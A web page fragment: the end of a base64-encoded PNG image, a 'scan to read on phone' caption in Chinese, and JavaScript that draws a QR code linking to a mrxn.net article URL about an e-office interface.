EwLL35og+qlgI0D8ELza06bN8ZfSQPqMvvsJGU/jDdbHQJz2FfY96/+q3uvkYu+34/oLrzzm4XxnmiuE5CFY2hh1rYpRG9eVqxi1V9fHQF4tuH1/9gROA4HcFTDjV7cBqbeu7pgK+RWWtwLSB4LWQTicUY8Is6f6jqFv1Gq90yH9zIsQHWY0/wqeBvJK0e35cyfwywOB9d1Qd1gFzHkIf/UlVY+KV/3lK39FrZ8FzHuBmVsL0SFYvSsgXJ9YuTG6Ll/hLw9k1fTWfv4EfttAvCPgtbsGZh+sOUS3v/jKS4bU6rUWost3+a53f8/LIf0hqN7RfiP+toH0i938507gNJBxWuN6116PeTnMdweEQ1DfVZ15SJ3c+hHNwexVF62B+GDGnU8d4u99zKt3NA+pl494GsiYvNd//wSOgUCmBs/x1S16d+iXi12HXNd8R/0ixC8vtKbWFXKxtAqYa3u+PBUw+2Dm5amwXiytAuKHGStXAbMO3P+f+seb/RxPyJvt6/92O/8BAAD//9aVYi0AAAAGSURBVAMAuvCtqlzDPhIAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word\_update.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 